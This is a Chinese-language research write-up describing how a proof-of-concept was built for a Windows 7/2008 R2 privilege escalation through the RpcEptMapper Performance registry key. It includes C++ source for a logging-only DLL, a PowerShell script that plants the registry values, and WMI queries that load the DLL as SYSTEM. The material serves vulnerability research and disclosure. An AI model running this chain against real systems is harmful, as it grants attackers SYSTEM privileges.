在本文的上篇中，我们为读者详细介绍了Windows系统中因RpcEptMapper服务不安全的注册表权限所致本地提权漏洞的发现过程，在本文中，我们将为读者详细介绍如何编写和测试相应的PoC代码。

  

 **（接上文）**

  

## 编写PoC代码

  

借助于从文档中收集到的代码片段，编写一个简单的概念验证DLL应该是不算难事。但是，我们还是需要一个计划!

  

当我需要利用某种DLL劫持漏洞时，我通常会从一个简单的自定义日志辅助函数开始下手。这个函数的目的是每当它被调用时，就把一些关键信息写入一个文件中。通常情况下，我会记录当前进程和父进程的PID，运行该进程的用户名称和相应的命令行。此外，我还会记录触发这个日志事件的函数的名称。这样，我就知道代码中的哪一部分被执行了。

  

在我撰写的其他文章中，我总是跳过代码开发部分，因为我认为该任务相对来说还是比较简单的。同时，我也希望自己文章对初学者更友好一些，而前面的做法是有悖于后者的愿望的。所以，我将在这里通过详细介绍漏洞利用代码的开发过程来补救这种情况。那么，让我们启动Visual
Studio，创建一个新的“C++ Console App”项目。实际上，我最初创建的是一个“Dynamic-Link Library
(DLL)”项目，但后来发现，如果直接从一个控制台应用程序下手的话，事情会更容易一些。

  

下面是Visual Studio生成的初始代码：

  

#include <iostream>

  

int main()

{

std::cout << "Hello World!\n";

}

  

当然，那不是我们想要的。我们要创建一个DLL，而不是EXE，因此，我们必须用DllMain替换main函数。您可以在下面的文档中找到该函数的框架代码：“Initialize
a DLL”。

  

#include <Windows.h>

  

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason,
LPVOID const reserved)

{

switch (reason)

{

case DLL_PROCESS_ATTACH:

Log(L"DllMain"); // See log helper function below

break;

case DLL_THREAD_ATTACH:

break;

case DLL_THREAD_DETACH:

break;

case DLL_PROCESS_DETACH:

break;

}

return TRUE;

}

  

同时，我们还需要修改项目的相关设置，指定输出的编译文件应该是DLL，而不是EXE。为此，我们可以打开项目属性，在“General”部分，将“Configuration
Type”设置为“Dynamic Library (.dll)”。在标题栏的正下方，我们还可以选中“All Configurations”和“All
Platforms”，这样的话，这个设置就可以全局应用了。

  

接下来，添加我们的自定义日志辅助函数：

  

#include <Lmcons.h> // UNLEN + GetUserName

#include <tlhelp32.h> // CreateToolhelp32Snapshot()

#include <strsafe.h>

  

void Log(LPCWSTR pwszCallingFrom)

{

LPWSTR pwszBuffer, pwszCommandLine;

WCHAR wszUsername[UNLEN + 1] = { 0 };

SYSTEMTIME st = { 0 };

HANDLE hToolhelpSnapshot;

PROCESSENTRY32 stProcessEntry = { 0 };

DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0,
dwParentProcessId = 0, dwBufSize = 0;

BOOL bResult = FALSE;

  

// Get the command line of the current process

pwszCommandLine = GetCommandLine();

  

// Get the name of the process owner

GetUserName(wszUsername, &dwPcbBuffer);

  

// Get the PID of the current process

dwProcessId = GetCurrentProcessId();

  

// Get the PID of the parent process

hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

stProcessEntry.dwSize = sizeof(PROCESSENTRY32);

if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {

do {

if (stProcessEntry.th32ProcessID == dwProcessId) {

dwParentProcessId = stProcessEntry.th32ParentProcessID;

break;

}

} while (Process32Next(hToolhelpSnapshot, &stProcessEntry));

}

CloseHandle(hToolhelpSnapshot);

  

// Get the current date and time

GetLocalTime(&st);

  

// Prepare the output string and log the result

dwBufSize = 4096 * sizeof(WCHAR);

pwszBuffer = (LPWSTR)malloc(dwBufSize);

if (pwszBuffer)

{

StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d -USER='%s' - CMD='%s' - METHOD='%s'\r\n",

st.wHour,

st.wMinute,

st.wSecond,

dwProcessId,

dwParentProcessId,

wszUsername,

pwszCommandLine,

pwszCallingFrom

);

  

LogToFile(L"C:\\\LOGS\\\RpcEptMapperPoc.log", pwszBuffer);

  

free(pwszBuffer);

}

}

  

然后，我们可以用文档中的三个函数来填充DLL。该文档还指出，如果成功的话，它们应该返回ERROR_SUCCESS。

  

DWORD APIENTRY OpenPerfData(LPWSTR pContext)

{

Log(L"OpenPerfData");

return ERROR_SUCCESS;

}

  

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData,
LPDWORD pObjectsReturned)

{

Log(L"CollectPerfData");

return ERROR_SUCCESS;

}

  

DWORD APIENTRY ClosePerfData()

{

Log(L"ClosePerfData");

return ERROR_SUCCESS;

}

  

好了，现在该项目已经配置好了，DllMain函数也写好了，同时，我们还创建了一个日志辅助函数和三个必要的函数。不过，如果我们编译这段代码，OpenPerfData、CollectPerfData和ClosePerfData将只能作为内部函数使用，所以，我们需要导出它们。实际上，导出这些函数的方式有许多种。例如，我们可以创建一个DEF文件，然后对项目进行适当的配置。然而，我更喜欢使用关键字__declspec(dllexport)，因为它特别适用于这样的小型项目。这样的话，我们只需要在源代码的开头部分声明这三个函数就可以了。

  

extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);

extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery,
PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);

extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();

  

对完整的代码感兴趣的读者，请访问这里。

  

最后，我们可以选择“Release/x64”和“Build the
solution”选项。这样的话，就能得到我们的DLL文件：.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll。

  

## 测试PoC

  

在进行其他工作之前，我们需要通过单独测试来确保这里的payload能够正常工作。这样做的好处是，在这里只需花费很少的一点时间，就可以避免在调试阶段掉进兔子洞，从而节约很多时间。为了进行该项测试，只需使用rundll32.exe程序，并以DLL的名称和导出函数的名称作为参数传递给它即可。

  

C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData

  

![](https://image.3001.net/images/20201203/1606960073_5fc843c994f2482a30c08.gif!small)

很好，现在日志文件就创建好了，如果我们打开该文件，将看到两条内容。其中，第一条是在DLL被rundll32.exe加载时写入的；第二条则是在调用OpenPerfData时写入的。看起来一切正常！

  

[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32
DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'

[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32
DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'

  

好了，现在我们可以专注于实际的漏洞了，并开始创建所需的注册表键和值。为此，我们既可以使用reg.exe /
regedit.exe命令手动完成该任务，也可以通过脚本以编程的方式完成该任务。由于在最初的研究中已介绍过手动方式了，因此，下面将展示一种更利索的方法：用PowerShell脚本来完成同样的事情。此外，通过PowerShell创建注册表键和值的方法，是否像调用New-Item和New-ItemProperty一样简单呢？

  

![](https://image.3001.net/images/20201203/1606960137_5fc84409eb62ca12aa359.png!small)

  

我们好像不具备访问注册表所需的权限……嗯，好吧……看来事情不是我们想的那么简单。

  

老实说，我并没有深入考察过这个问题 但据我猜测：当我们调用New-Item时，powershell.exe实际上会尝试通过某些标志来打开父注册表键，但是我们缺乏相应的权限。

  

无论如何，如果内置的cmdlets无法胜任该工作，我们总是可以进入下一层，直接调用DotNet函数。事实上，注册表键也可以用PowerShell中的以下代码来创建。

  

[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")

  

![](https://image.3001.net/images/20201203/1606960174_5fc8442e94163f6248213.png!small)

最后，我把所需的代码都放入下面的脚本中，以便创建适当的键和值，等待用户输入一些内容，最后，再将这些东西都清理掉。

  

$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

  

Write-Host "[*] Create 'Performance' subkey"

[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)

Write-Host "[*] Create 'Library' value"

New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value
"$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null

Write-Host "[*] Create 'Open' value"

New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value
"OpenPerfData" -PropertyType "String" -Force | Out-Null

Write-Host "[*] Create 'Collect' value"

New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value
"CollectPerfData" -PropertyType "String" -Force | Out-Null

Write-Host "[*] Create 'Close' value"

New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value
"ClosePerfData" -PropertyType "String" -Force | Out-Null

  

Read-Host -Prompt "Press any key to continue"

  

Write-Host "[*] Cleanup"

Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force

Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force

Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force

Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force

[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)

  

现在是最后一步：我们该如何诱骗RPC Endpoint Mapper服务加载我们的Performace
DLL呢？不幸的是，我并没有将所有的尝试过程都记录下来。就本文来说，如果能强调一下研究工作有时是多么的枯燥和耗时，那将会非常有趣。无论如何，我在研究过程中发现的一件事是，我们可以使用WMI（Windows
Management Instrumentation，WMI）查询Performance
Counter（性能计数器），这好像并不太令人惊讶。这方面的更多信息，请访问“WMI Performance Counter Types”一文。

  

对于计数器类型来说，不仅以CounterType限定符的形式出现在Win32_PerfRawData类的属性中，同时以CookingType限定符的形式出现在Win32_PerfFormattedData类的属性中。

  

所以，我首先在PowerShell中用下面的命令找出了与Performace Data（性能数据）相关的WMI类：

  

Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }

  

![](https://image.3001.net/images/20201203/1606960214_5fc84456c858ca6b4bd0c.png!small)

这时我们发现，日志文件几乎马上就创建好了! 下面是文件的内容：

  

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'

[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' -CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'

  

我本以为在RpcEptMapper服务的上下文中，最多只能以NETWORK
SERVICE的身份执行任意代码，但是，看起来我得到的结果比预期的要好得多。实际上，我在WMI服务本身的上下文中实现了任意代码的执行能力，并且代码是以LOCAL
SYSTEM的身份运行的。这是多么的神奇啊！

  

注意：如果我能够以NETWORK SERVICE的身份执行任意代码的话，则离LOCAL
SYSTEM账户的身份就只有一个令牌之遥了，这主要归功于几个月前James Forshaw在下面的文章中所演示的技巧：“Sharing a Logon
Session a Little Too Much”。

  

我对下面的每个WMI类都进行了试验，结果是完全一样的：

  

Get-WmiObject Win32_Perf

Get-WmiObject Win32_PerfRawData

Get-WmiObject Win32_PerfFormattedData

  

## 小结

  

我不知道为什么这个漏洞在这么长的时间内一直没有被人所发现。其中一种解释是，其他工具可能在注册表中寻找的是完整的写权限，而就本文所讨论的情形而言，其实AppendData/AddSubdirectory权限就已经足够了。关于“错误配置”本身，我认为注册表键被设置成这样是有特定目的的，尽管我想不出用户需要任何类型的权限来修改服务配置的具体场景。

  

  

我之所以决定把这个漏洞公布出来，主要有两个原因。第一个原因是，实际上我在几个月前用GetModfiableRegistryPath函数更新我的PrivescCheck脚本的那天，就已经把它公开了——虽然最初并没有意识到。第二个原因是，该漏洞的影响不是很大。因为要想利用这个漏洞，要求攻击者必须事先获得本地访问权限，并且该漏洞只影响不再受支持的旧版本Windows系统（除非您购买了Extended
Support服务……）。现在，如果您还在使用Windows 7 / Server 2008
R2系统，并且没有在网络中正确隔离这些机器，那么防止攻击者获得SYSTEM权限可能是您首先需要担心的事情。

  

除了用于这里介绍的权限提升漏洞外，我认为这个“Perfomance”注册表设置还为后期利用、横向移动和AV/EDR规避打开了一扇窗户。我已经想到了一些特定的场景，但我还没有进行具体的测试。至于这些话题，我们今后有机会再聊。

  

## 参考资料

  

GitHub - PrivescCheck

https://github.com/itm4n/PrivescCheck

  

GitHub - PowerUp

https://github.com/HarmJ0y/PowerUp

  

Microsoft - “HKLM\SYSTEM\CurrentControlSet\Services Registry Tree”

https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree

  

Microsoft - Creating the Application’s Performance Key

https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key

  

